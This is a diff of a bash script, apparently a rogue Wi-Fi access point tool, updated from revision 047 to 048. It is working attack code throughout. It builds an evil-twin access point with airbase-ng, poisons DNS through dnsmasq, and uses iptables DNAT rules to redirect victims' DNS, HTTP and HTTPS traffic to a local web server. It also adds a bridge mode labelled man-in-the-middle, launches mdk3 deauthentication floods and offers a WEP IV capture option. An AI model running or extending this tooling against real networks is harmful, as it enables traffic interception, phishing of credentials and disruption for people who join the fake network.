@@ -5,7 +5,7 @@
 ####################
 # GLOBAL VARIABLES #
 ####################
-REVISION=047
+REVISION=048
 function todo(){
 echo "TODO LIST FOR NEWER REVISIONS"
 echo "- Fix For Ping Victim"
@@ -14,7 +14,6 @@ echo "- Cleanup Errors On Script Exit"
 ####################
 #  CONFIG SECTION  #
 ####################
-AUTOMODE=FALSE             #You Can Set AutoMode To TRUE | FALSE
 at0IP=192.168.0.1          #ip address of moniface
 NETMASK=255.255.0.0        #subnetmask
 WILDCARD=0.0.255.255       #dunno what this is
@@ -36,9 +35,6 @@ touch $LOG
 touch $folder/missing.log
 ######################
 function automode(){
-monitormodestop
-mode=1
-verbose=0
 ATHIFACE=wlan0
 ESSID=WiFi
 CHAN=1
@@ -49,7 +45,7 @@ WIFILIST=
 OTHEROPTS=
 MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
 SPOOFMAC=
-DHCPSERVER=1
+if [ "$mode" = "2" ]; then DHCPSERVER=4; else DHCPSERVER=1; fi
 DNSURL=#
 }
 OK=`printf "\e[1;32m OK \e[0m"`
@@ -58,7 +54,6 @@ function control_c(){
 echo ""
 echo ""
 echo "CTRL+C Was Pressed..."
-echo ""
 stopshit
 monitormodestop
 cleanup
@@ -66,25 +61,28 @@ exit 0
 }
 trap control_c SIGINT
 function cleanup(){
+ifconfig $LANIFACE down
+ifconfig $ATHIFACE down
+ifconfig br-lan down
+brctl delbr br-lan
 mv $LOG $HOME/accesspoint.log
 rm -rf $folder
 mv $APACHECONF/default~ $APACHECONF/default
 dhcpconf=/etc/dhcp3/dhcpd.conf
 echo > $dhcpconf
 echo > /etc/dnsmasq.conf
-mv /etc/resolv.conf~ /etc/resolv.conf
 echo "Log File: $HOME/accesspoint.log"
 }
 function pinginternet(){
 echo "Pinging Google [8.8.8.8] with 64 bytes of data:"
-INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 10))
+INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then echo "Reply from 8.8.8.8: bytes=64"; else echo "Request timed out."; fi
 }
 function pinggateway(){
 GATEWAYRDNS=$(route | awk '/UG/ { print $2 }')
 GATEWAY=$(route -n | awk '/UG/ { print $2 }')
 echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
-GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 10))
+GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
 if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
 }
 function pingvictim(){
@@ -131,7 +129,7 @@ service apache2 stop &>$LOG
 service dhcp3-server stop &>$LOG
 service dnsmasq stop &>$LOG
 service network-manager stop &>$LOG
-for pid in `ls $folder/*.pid 2>$LOG`; do if [ -s "$pid" ]; then 
+for pid in `ls $folder/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
 kill `cat $folder/airbase-ng.pid 2>$LOG` &>/dev/null
 kill `cat $folder/dnsmasq.pid 2>$LOG` &>/dev/null
 kill `cat $folder/probe.pid 2>$LOG` &>/dev/null
@@ -152,14 +150,19 @@ echo "0" > /proc/sys/net/ipv4/ip_forward
 function firewall(){
 iptables -P FORWARD ACCEPT
 iptables -P INPUT ACCEPT
-iptables -A FORWARD -i at0 -j ACCEPT
-iptables -t nat -A POSTROUTING -j MASQUERADE
 iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
 iptables -A INPUT -i lo -j ACCEPT
+iptables -t nat -A POSTROUTING -j MASQUERADE
 echo "1" > /proc/sys/net/ipv4/ip_forward
 }
+function firewallportal(){
+iptables -t mangle -N internet
+iptables -t mangle -A PREROUTING -i at0 -p tcp -m tcp --dport 80 -j internet
+iptables -t mangle -A internet -j MARK --set-mark 99
+iptables -t nat -A PREROUTING -i at0 -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $at0IP
+}
 function dhcpd3server(){
-echo "| DHCPD3 SERVER!!!"
+echo "* DHCPD3 SERVER!!! *"
 replace INTERFACES=\"\" INTERFACES=\"at0\" -- /etc/default/dhcp3-server
 echo "" > /var/lib/dhcp3/dhcpd.leases
 mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd;
@@ -210,40 +213,47 @@ echo "dhcp-host=$MAC,$at0IP" >> /etc/dnsmasq.conf
 echo "nameserver $at0IP" > $folder/resolv.conf
 if [ "$mode" = "1" ]; then startdnsmasq; fi
 if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
-
 }
 function udhcpdserver(){
 gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 "udhcpd"
 }
 function brlan(){
+ifconfig br-lan down
+brctl delbr br-lan
+sleep 1
 brctl addbr br-lan
-brctl addif br-lan $LANIFACE
 brctl addif br-lan at0
-ifconfig eth0 0.0.0.0 up
+brctl addif br-lan $LANIFACE
 ifconfig at0 0.0.0.0 up
+ifconfig $LANIFACE 0.0.0.0 up
 ifconfig br-lan up
-echo "+===================================+"
-echo "| ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan)"
-echo "+===================================+"
-dhclient3 br-lan &>/dev/null
-sleep 5
-brctl show > $folder/bridged.txt
+iptables -A FORWARD -i br-lan -j ACCEPT
+echo ""
+echo "* ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan) *"
+dhclient3 br-lan &>$folder/bridge.log
+BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $folder/bridge.log))
+while [ "$BRLANDHCP" = "No" ]; do
+echo ""
+echo "* No DHCP Server Found On $LANIFACE (br-lan) [$FAIL] *"
+rm $folder/bridge.log
+brlan
+done
+GATEWAY=
+#route add -net $at0IPBLOCK netmask $NETMASK gw $GATEWAY
 }
 function lanifacemenu(){
 echo "+===================================+"
-echo "| SHOWING IFCONFIG"
+echo "| Interface With Internet?          |"
 echo "+===================================+"
 echo ""
-ifconfig | grep HWaddr
+awk '/HWaddr/' < <(ifconfig)
 echo ""
-read -e -p "interface with connection to internet (eth0 eth1......) " LANIFACE
-brlan
+read -e -p "Option: " LANIFACE
 }
 function monitormodestop(){
-echo "+===================================+"
-echo "| ATTEMPTING TO STOP (monitor-mode)"
-echo "+===================================+"
+echo ""
+echo "* ATTEMPTING TO STOP MONITOR-MODE *"
 if [ "$ATHIFACE" = "" ]; then 
 ATHIFACE=`ifconfig wlan | awk '/encap/ {print $1}'`
 fi
@@ -257,32 +267,30 @@ sleep 2
 }
 function monitormodestart(){
 airmon-ng check kill > $folder/monitormodepslist.txt
-#ifconfig $ATHIFACE down
-#iwconfig $ATHIFACE channel $CHAN
-#ifconfig $ATHIFACE up
-echo "+===================================+"
-echo "| ATTEMPTING TO START (monitor-mode) ON $ATHIFACE"
-echo "+===================================+"
-airmon-ng start $ATHIFACE > $folder/monitormode.txt
+echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
+airmon-ng start $ATHIFACE $CHAN > $folder/monitormode.txt
 MONIFACE=`awk '/enabled/ { print $5 }' $folder/monitormode.txt | head -c -2`
-#ifconfig $MONIFACE down
-sleep 2
-#iwconfig $MONIFACE channel $CHAN
 if [ "$SPOOFMAC" != "" ]; then
 macchanger -m $SPOOFMAC $MONIFACE
 fi
-#ifconfig $MONIFACE up
-echo "| Monitor Mode Enabled On $MONIFACE (CH: $CHAN)"
-echo "+===================================+"
+if [ "$MONIFACE" != "" ]; then
+echo ""
+echo "* MONITOR MODE ENABLED ON ($MONIFACE) [$OK] *"
+echo "";
+else
+echo ""
+echo "* COULD NOT ENABLE MONITOR MODE ON ($ATHIFACE) [$FAIL] *"
+echo "IF YOU THINK THIS IS AN ERROR PLEASE REPORT IT TO"
+echo "THE SCRIPT AUTHOR OR CHECK IF YOUR CARD IS SUPPORTED"
+echo ""; fi
 }
 function poisonmenu(){
 echo "+===================================+"
 echo "| Choose You're Poison?             |"
 echo "+===================================+"
-echo "| 1) Webserver Mode | *DEFAULT*      "
-echo "| 2) Attack Mode | Man In The Middle "
-echo "| 3) IRC Mode | IRC Server Required  "
-echo "| 4) Capture IVs For WEP Attack      "
+echo "| 1) Attack Mode | *DEFAULT*         "
+echo "| 2) Bridge Mode | Man In The Middle "
+echo "| 3) Capture IVs For WEP Attack      "
 echo "| U) Update Script To The Latest     "
 echo "| Q) Quit Mode | YOU SUCK LOOSER     "
 echo "+===================================+"
@@ -299,7 +307,6 @@ echo "| Verbosity Level?                  |"
 echo "+===================================+"
 echo "| 0) Use Default Settings *CAUTION*  "
 echo "| 1) Answer Some Questions To Setup  "
-echo "| 2) Puts AirBase-NG Into Verbose    "
 echo "+===================================+"
 echo ""
 read -e -p "Option: " verbose
@@ -342,18 +349,18 @@ if [ "$attack" = "" ]; then clear; attackmenu; fi
 function startdnsmasq(){
 echo "no-poll" >> /etc/dnsmasq.conf
 echo "no-resolv" >> /etc/dnsmasq.conf
-echo "| DNSMASQ DNS POISON!!!             |"
+echo "* DNSMASQ DNS POISON!!! *"
 gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf --pid-file=$folder/dnsmasq.pid"
+"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
-echo "| DNSMASQ With Internet             |"
+echo "* DNSMASQ With Internet *"
 gnome-terminal --geometry=134x35 --hide-menubar --title=DNSERVER -e \
-"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf --pid-file=$folder/dnsmasq.pid"
+"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
 }
 function nodhcpserver(){
-echo "Not Using A Local DHCP Server For MitM"
+echo "* Not Using A Local DHCP Server *"
 }
 function taillogs(){
 echo > /var/log/syslog
@@ -401,7 +408,7 @@ echo ""
 read -e -p "Option: " DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
-gnome-terminal --geometry=130x15 --hide-menubar -e "mdk3 $MONIFACE d -c 1,2,3,4,5,6,7,8,9,10,11 -w $folder/whitelist.txt"
+gnome-terminal --geometry=130x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $folder/whitelist.txt"
 fi
 if [ "$DEAUTHPROG" = "3" ]; then
 DEAUTHPROG=airdrop-ng
@@ -682,7 +689,7 @@ echo "+===================================+"
 # Are we root?
 if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
 else
-echo "| [$FAIL] Please Run This Script As Root or With Sudo!";
+echo "[$FAIL] Please Run This Script As Root or With Sudo!";
 echo "";
 exit 0; fi
 type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq"; echo "dnsmasq" >> $folder/missing.log;}
@@ -710,12 +717,13 @@ echo "+===================================+"
 stopshit
 modprobe tun
 echo ""
-if [ "$AUTOMODE" = "FALSE" ]; then poisonmenu; fi
-if [ "$AUTOMODE" = "FALSE" ]; then verbosemenu; fi
-if [ "$AUTOMODE" = "FALSE" ]; then dhcpmenu; fi
-if [ "$AUTOMODE" = "TRUE" ]; then automode;
-else
+poisonmenu
+verbosemenu
+if [ "$mode" != "2" ]; then dhcpmenu;
+else lanifacemenu; fi
 monitormodestop
+if [ "$verbose" = "0" ]; then automode;
+else
 echo ""
 echo "+===================================+"
 echo "| Listing Wireless Devices          |"
@@ -754,35 +762,31 @@ fi
 echo ""
 monitormodestart
 if [ "$mode" = "4" ]; then wepattackmenu; fi
-if [ "$mode" = "2" ]; then
-lanifacemenu
-fi
-echo "+===================================+"
-echo "| STARTING ACCESS POINT: $ESSID "
-echo "| IP: $at0IP "
+#
+echo "* STARTING ACCESS POINT: $ESSID *"
+echo "* IP: $at0IP *"
 if [ "$verbose" -gt "0" ]; then
-echo "| BSSID: $MAC "
-echo "| CHANNEL: $CHAN "
-echo "| PACKETS PER SECOND: $PPS "
-echo "| BEACON INTERVAL: $BEAINT "
-echo "| MONITOR INTERFACE: $MONIFACE "
+echo "* BSSID: $MAC *"
+echo "* CHANNEL: $CHAN *"
+echo "* PACKETS PER SECOND: $PPS *"
+echo "* BEACON INTERVAL: $BEAINT *"
 fi
-echo "+===================================+"
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
+#
+airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
 #airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
 sleep 4
 ps aux | awk '/[a]irbase-ng/ { print $2 }' > $folder/airbase-ng.pid
+if [ "$mode" != "2" ]; then
 ifconfig at0 up
-ifconfig at0 $at0IP netmask $NETMASK
-ifconfig at0 mtu $MTU
-# route add -net 169.254.0.0 netmask 255.255.0.0 gw 0.0.0.0
-# route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP
-echo "+===================================+"
+ifconfig at0 $at0IP netmask $NETMASK;
+ifconfig at0 mtu $MTU;
+route add -net $at0IPBLOCK netmask $NETMASK gw $at0IP; fi
+#
 if [ "$DHCPSERVER" = "1" ]; then dnsmasqserver; fi
 if [ "$DHCPSERVER" = "2" ]; then dhcpd3server; fi
 if [ "$DHCPSERVER" = "3" ]; then udhcpdserver; fi
 if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
-echo "+===================================+"
+#
 if [ "$mode" = "1" ]; then
 ERRORFILE=$(awk '/index/ { print $1 }' < <(ls /var/www))
 if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
@@ -795,6 +799,8 @@ APACHECONF=/etc/apache2/sites-available
 if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
 else cp $APACHECONF/default $APACHECONF/default~; fi
 service apache2 start > /dev/null
+firewall
+iptables -A FORWARD -i at0 -j ACCEPT
 #iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP:53
 iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:53
 #iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP:67
@@ -803,32 +809,17 @@ iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:
 #iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP:68
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP:80
 iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP:443
-iptables -t nat -A POSTROUTING -o $ATHIFACE -j MASQUERADE
-firewall
-cp /etc/resolv.conf /etc/resolv.conf~
+iptables -t nat -A POSTROUTING -o at0 -j MASQUERADE
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
-echo "nameserver $at0IP" > /etc/resolv.conf
-if [ "$INTERNETTEST" = "64" ]; then
-echo "nameserver $GATEWAY" > /etc/resolv.conf;
-fi
-echo "+===================================+"
-echo "| APACHE2 WEB SERVER!!!             |"
-echo "+===================================+"
+echo "nameserver $at0IP" >> /etc/resolv.conf
+echo "* APACHE2 WEB SERVER!!! *"
 fi
 if [ "$mode" = "2" ]; then
-#iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
-iptables -t nat -A PREROUTING -p tcp -j DNAT --to $GW
-iptables -t nat -A PREROUTING -p udp -j DNAT --to $GW
-iptables -t nat -A POSTROUTING -o $LANIFACE -j MASQUERADE
-#iptables -t nat -A PREROUTING -i $LANIFACE -p tcp --dport 80 -j REDIRECT --to-port 3128
-#iptables -t nat -A POSTROUTING -o $LANIFACE -p tcp --dport 3128 -j REDIRECT --to-port 80
 firewall
+brlan
+iptables -t nat -A POSTROUTING -o br-lan -j MASQUERADE
+echo "# Generated by accesspoint.sh" > /etc/resolv.conf
+echo "nameserver $GATEWAY" >> /etc/resolv.conf
 fi
 taillogs
 attackmenu
@@ -847,5 +838,5 @@ stopshit
 monitormodestop
 cleanup
 #firefox http://www.hackerbusters.ca/
-read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS WINDOW "
+read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS "
 fi
